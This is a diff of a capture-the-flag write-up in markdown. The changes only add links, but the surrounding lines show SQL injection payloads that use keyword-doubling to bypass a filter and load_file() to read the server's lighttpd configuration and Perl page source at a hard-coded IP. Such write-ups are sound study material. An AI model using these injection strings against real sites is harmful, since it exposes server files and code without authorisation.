@@ -74,6 +74,7 @@ To verify I can read files I started with '/bin/ls' which is always there
 ```email = "A' UNunionION SELselectECT ()open('/bin/ls').read().encode('hex'),1,1,1,1 #"```
 
 That didn't work... maybe it isn't written in python?
+
 Let's try to visit 
 
 http://104.198.80.195/public/index.py - Nope!
@@ -86,11 +87,11 @@ http://104.198.80.195/public/index.pl - It works!
 
 So the index page is written in perl.
 
-And to get the configuration we can use the following query:
+And to get the [configuration](lighttpd.conf) we can use the following query:
 
 ```email = "A' UNunionION SELselectECT ()hex(load_file('/etc/lighttpd/lighttpd.conf')),1,1,1,1 #"```
 
-Which contains the name of our index page, to get it we use:
+Which contains the name of our [index page (source)](index.pl), to get it we use:
 
 ```email = "A' UNunionION SELselectECT ()hex(load_file('/var/www/html/public/index.pl')),1,1,1,1 #"```
 
